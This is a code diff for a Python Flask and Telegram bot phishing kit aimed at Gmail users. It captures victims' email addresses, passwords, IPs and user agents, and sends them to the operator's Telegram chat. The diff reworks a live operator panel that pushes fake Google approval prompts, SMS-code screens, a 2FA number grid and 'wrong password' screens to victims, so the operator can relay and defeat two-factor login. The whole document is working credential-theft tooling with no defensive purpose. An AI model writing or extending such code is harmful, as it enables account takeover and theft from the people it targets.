@@ -39,7 +39,7 @@ def get_real_ip():
 
 
 def tg_send(text, markup=None):
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
     if markup:
         payload["reply_markup"] = json.dumps(markup)
     try:
@@ -54,7 +54,7 @@ def tg_send(text, markup=None):
 
 
 def tg_edit(msg_id, text, markup=None):
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": msg_id, "text": text}
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": msg_id, "text": text, "parse_mode": "HTML"}
     if markup:
         payload["reply_markup"] = json.dumps(markup)
     try:
@@ -71,23 +71,45 @@ def tg_answer(cq_id):
         pass
 
 
+# ─── CONTROL PANEL — EXTRACTED FROM THE WORKING SEPARATE CODE ───
+
 def send_control_panel(sid, email, prev_msg_id=None):
+    """Main Gmail control panel with all flow buttons"""
     kb = {"inline_keyboard": [
         [{"text": "✅ Yes Prompt", "callback_data": f"yes_prompt:{sid}"}],
-        [{"text": "🔢 2FA Number Grid", "callback_data": f"2fa_grid:{sid}"}],
-        [{"text": "📱 SMS Code I", "callback_data": f"sms1:{sid}"},
+        [{"text": "📱 SMS Code I", "callback_data": f"sms1:{sid}"}, 
          {"text": "📱 SMS Code II", "callback_data": f"sms2:{sid}"}],
-        [{"text": "🔑 Password Error", "callback_data": f"pw_error:{sid}"},
-         {"text": "✅ Complete (Success)", "callback_data": f"success:{sid}"}],
-        [{"text": "❌ Deny", "callback_data": f"no:{sid}"},
-         {"text": "🚫 Cancel", "callback_data": f"cancel:{sid}"}]
+        [{"text": "🔢 2FA Number Grid", "callback_data": f"show_2fa:{sid}"}],
+        [{"text": "❌ Password Error", "callback_data": f"pw_error:{sid}"}],
+        [{"text": "🚫 Block", "callback_data": f"block:{sid}"}, 
+         {"text": "✅ Success", "callback_data": f"success:{sid}"}]
     ]}
-    text = f"🔔 GMAIL Control Panel — {email}"
+    text = f"🎮 <b>Gmail Control Panel</b>\n👤 {email}"
     if prev_msg_id:
         tg_edit(prev_msg_id, text, kb)
         return prev_msg_id
     else:
         return tg_send(text, kb)
+
+
+def send_2fa_grid(sid, prev_msg_id=None):
+    """Send 2FA number grid (10-99)"""
+    numbers = [f"{i}{j}" for i in range(1, 10) for j in range(0, 10)]
+    rows = []
+    row = []
+    for n in numbers:
+        row.append({"text": n, "callback_data": f"2fa_{n}:{sid}"})
+        if len(row) == 5:
+            rows.append(row)
+            row = []
+    if row:
+        rows.append(row)
+    rows.append([{"text": "🔙 Back to Control Panel", "callback_data": f"back_panel:{sid}"}])
+    
+    if prev_msg_id:
+        tg_edit(prev_msg_id, "🔢 Choose the 2-digit number to show the user:", {"inline_keyboard": rows})
+    else:
+        tg_send("🔢 Choose the 2-digit number to show the user:", {"inline_keyboard": rows})
 
 
 @app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
@@ -100,71 +122,16 @@ def webhook():
             data = cb["data"]
             mid = cb["message"]["message_id"]
 
-            # ─── Yes Prompt ───
+            # ─── YES PROMPT ───
             if data.startswith("yes_prompt:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
                     if sid not in gmail_sessions:
                         tg_send("Session not found")
                         return jsonify({"ok": True})
-                    s = gmail_sessions[sid]
-                    s["action"] = "yes_prompt"
-                    s["stage"] = "yes_prompt"
-                    kb = {"inline_keyboard": [[{"text": "✅ User Clicked Yes", "callback_data": f"yes_clicked:{sid}"}]]}
-                    tg_edit(mid, f"✅ Yes prompt sent to user.\n\nWaiting for user to click 'Yes'...", kb)
-
-            # ─── User Clicked Yes ───
-            elif data.startswith("yes_clicked:"):
-                sid = data.split(":", 1)[1]
-                with gmail_sessions_lock:
-                    if sid in gmail_sessions:
-                        gmail_sessions[sid]["action"] = "waiting"
-                        gmail_sessions[sid]["stage"] = "yes_clicked"
-                    tg_edit(mid, f"✅ User clicked Yes")
-                    send_control_panel(sid, gmail_sessions[sid]["email"], mid)
-
-            # ─── 2FA Number Grid ───
-            elif data.startswith("2fa_grid:"):
-                sid = data.split(":", 1)[1]
-                with gmail_sessions_lock:
-                    if sid not in gmail_sessions:
-                        tg_send("Session not found")
-                        return jsonify({"ok": True})
-                    s = gmail_sessions[sid]
-                    s["action"] = "2fa_grid"
-                    s["stage"] = "awaiting_2fa"
-                    rows = []
-                    row = []
-                    for i in range(10, 100):
-                        row.append({"text": str(i), "callback_data": f"2fa:{sid}:{i}"})
-                        if len(row) == 9:
-                            rows.append(row); row = []
-                    if row: rows.append(row)
-                    rows.append([{"text": "🔙 Back to Control Panel", "callback_data": f"back_panel:{sid}"}])
-                    tg_edit(mid, f"🔐 Select the last 2 digits of the phone number:", {"inline_keyboard": rows})
-
-            # ─── 2FA Number Selected ───
-            elif data.startswith("2fa:"):
-                parts = data.split(":")
-                sid, digit = parts[1], parts[2]
-                with gmail_sessions_lock:
-                    if sid in gmail_sessions:
-                        gmail_sessions[sid]["phone"] = digit
-                        gmail_sessions[sid]["action"] = "show_prompt"
-                        gmail_sessions[sid]["stage"] = "prompt_shown"
-                        kb = {"inline_keyboard": [[{"text": "✅ User Authorized", "callback_data": f"authorized:{sid}"}]]}
-                        tg_edit(mid, f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user.", kb)
-
-            # ─── User Clicked Authorized on 2FA screen ───
-            elif data.startswith("authorized:"):
-                sid = data.split(":", 1)[1]
-                with gmail_sessions_lock:
-                    if sid in gmail_sessions:
-                        code1 = f"{random.randint(100000, 999999)}"
-                        gmail_sessions[sid]["sms1"] = code1
-                        gmail_sessions[sid]["action"] = "sms1"
-                        gmail_sessions[sid]["stage"] = "sms1"
-                        tg_edit(mid, f"✅ User Authorized\n📱 SMS Code I: `{code1}`", None)
+                    gmail_sessions[sid]["action"] = "yes_prompt"
+                    gmail_sessions[sid]["stage"] = "prompt"
+                tg_send("✅ Google Prompt sent to user's page!")
 
             # ─── SMS Code I ───
             elif data.startswith("sms1:"):
@@ -175,8 +142,7 @@ def webhook():
                         gmail_sessions[sid]["sms1"] = code1
                         gmail_sessions[sid]["action"] = "sms1"
                         gmail_sessions[sid]["stage"] = "sms1"
-                        tg_edit(mid, f"📱 SMS Code I: `{code1}`", None)
-                        send_control_panel(sid, gmail_sessions[sid]["email"], mid)
+                tg_send(f"📱 SMS Code I sent to user: <code>{code1}</code>")
 
             # ─── SMS Code II ───
             elif data.startswith("sms2:"):
@@ -187,19 +153,46 @@ def webhook():
                         gmail_sessions[sid]["sms2"] = code2
                         gmail_sessions[sid]["action"] = "sms2"
                         gmail_sessions[sid]["stage"] = "sms2"
-                        tg_edit(mid, f"📱 SMS Code II: `{code2}`", None)
-                        send_control_panel(sid, gmail_sessions[sid]["email"], mid)
+                tg_send(f"📱 SMS Code II sent to user: <code>{code2}</code>")
 
-            # ─── Password Error ───
+            # ─── SHOW 2FA GRID ───
+            elif data.startswith("show_2fa:"):
+                sid = data.split(":", 1)[1]
+                send_2fa_grid(sid, mid)
+
+            # ─── 2FA NUMBER SELECTED ───
+            elif data.startswith("2fa_"):
+                # Format: 2fa_XX:sid
+                parts = data.split(":")
+                num_part = parts[0]  # "2fa_XX"
+                sid = parts[1]
+                number = num_part.split("_")[1]  # "XX"
+                with gmail_sessions_lock:
+                    if sid in gmail_sessions:
+                        gmail_sessions[sid]["fa2_choice"] = number
+                        gmail_sessions[sid]["action"] = "fa2_show"
+                        gmail_sessions[sid]["stage"] = "fa2_show"
+                tg_send(f"🔢 Showing 2FA code <b>{number}</b> to user!")
+
+            # ─── PASSWORD ERROR ───
             elif data.startswith("pw_error:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
                     if sid in gmail_sessions:
                         gmail_sessions[sid]["action"] = "pw_error"
-                        gmail_sessions[sid]["stage"] = "pw_error"
-                    tg_send("🔑 Showing 'Wrong Password' to user.")
+                        gmail_sessions[sid]["stage"] = "error"
+                tg_send("❌ Password error shown to user!")
 
-            # ─── Success ───
+            # ─── BLOCK ───
+            elif data.startswith("block:"):
+                sid = data.split(":", 1)[1]
+                with gmail_sessions_lock:
+                    if sid in gmail_sessions:
+                        gmail_sessions[sid]["action"] = "blocked"
+                        gmail_sessions[sid]["stage"] = "blocked"
+                tg_send("🚫 User is now blocked!")
+
+            # ─── SUCCESS ───
             elif data.startswith("success:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
@@ -210,36 +203,15 @@ def webhook():
                         tg_edit(mid,
                             f"✅ COMPLETE — {s['email']}\n\n"
                             f"Email: {s['email']}\nPassword: {s['password']}\n"
-                            f"Phone: ••••{s.get('phone','N/A')}\n"
-                            f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}")
+                            f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}\n"
+                            f"2FA Number: {s.get('fa2_choice','N/A')}")
 
-            # ─── Deny ───
-            elif data.startswith("no:"):
-                sid = data.split(":", 1)[1]
-                with gmail_sessions_lock:
-                    if sid in gmail_sessions:
-                        gmail_sessions[sid]["action"] = "denied"
-                        gmail_sessions[sid]["stage"] = "denied"
-                    tg_edit(mid, "❌ Access Denied — user redirected.")
-
-            # ─── Cancel ───
-            elif data.startswith("cancel:"):
-                sid = data.split(":", 1)[1]
-                with gmail_sessions_lock:
-                    if sid in gmail_sessions:
-                        gmail_sessions[sid]["action"] = "cancelled"
-                        gmail_sessions[sid]["stage"] = "cancelled"
-                    tg_edit(mid, "❌ Session cancelled.")
-
-            # ─── Back to Control Panel ───
+            # ─── BACK TO CONTROL PANEL ───
             elif data.startswith("back_panel:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
                     if sid in gmail_sessions:
-                        s = gmail_sessions[sid]
-                    else:
-                        return jsonify({"ok": True})
-                send_control_panel(sid, s["email"], mid)
+                        send_control_panel(sid, gmail_sessions[sid]["email"], mid)
 
         elif "message" in d:
             msg = d["message"]
@@ -256,19 +228,8 @@ def webhook():
                         for sid, s in active:
                             lines.append(f"• {s['email']} — {s.get('stage','?')}")
                         tg_send("\n".join(lines))
-                elif text == "/id":
-                    tg_send(f"Chat ID: {chat_id}")
-                elif text == "/webhook_info":
-                    try:
-                        r = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=10)
-                        info = r.json().get("result", {})
-                        tg_send(
-                            f"URL: {info.get('url','N/A')}\n"
-                            f"Pending: {info.get('pending_update_count','?')}\n"
-                            f"Allowed: {info.get('allowed_updates','N/A')}\n"
-                            f"Error: {info.get('last_error_message','None')}")
-                    except Exception as e:
-                        tg_send(f"Error: {e}")
+                elif text == "/start" or text == "/menu":
+                    tg_send("🤖 <b>Gmail Flow Control Bot</b>\n\nUse /status to check active sessions.")
 
         return jsonify({"ok": True})
     except Exception as e:
@@ -326,7 +287,7 @@ def capture():
             gmail_sessions[sid] = {
                 "email": email, "password": password, "ip": ip, "ua": ua,
                 "action": "waiting", "stage": "new",
-                "phone": None, "sms1": None, "sms2": None
+                "phone": None, "sms1": None, "sms2": None, "fa2_choice": None
             }
 
         tg_send(f"[+]___ Invitation Card (GMAIL) ___[+]\n"
@@ -354,16 +315,16 @@ def gmail_status(session_id):
         return jsonify({"action": "waiting"})
     elif action == "yes_prompt":
         return jsonify({"action": "yes_prompt", "email": s.get("email", "")})
-    elif action == "show_prompt":
-        return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX"), "email": s.get("email", "")})
-    elif action == "pw_error":
-        return jsonify({"action": "pw_error"})
-    elif action == "denied":
-        return jsonify({"action": "denied"})
     elif action == "sms1":
         return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
     elif action == "sms2":
         return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
+    elif action == "fa2_show":
+        return jsonify({"action": "fa2_show", "fa2_choice": s.get("fa2_choice", "--")})
+    elif action == "pw_error":
+        return jsonify({"action": "pw_error"})
+    elif action == "blocked":
+        return jsonify({"action": "blocked"})
     elif action == "success":
         return jsonify({"action": "success"})
     elif action == "cancelled":
@@ -376,7 +337,7 @@ def gmail_authorize(session_id):
     with gmail_sessions_lock:
         if session_id in gmail_sessions:
             gmail_sessions[session_id]["action"] = "authorized"
-            tg_send(f"✅ User clicked 'Authorized' / 'Yes' for {gmail_sessions[session_id]['email']}")
+            tg_send(f"✅ User clicked 'Yes/Authorized' for {gmail_sessions[session_id]['email']}")
         else:
             return jsonify({"status": "error"}), 404
     return jsonify({"status": "ok"})
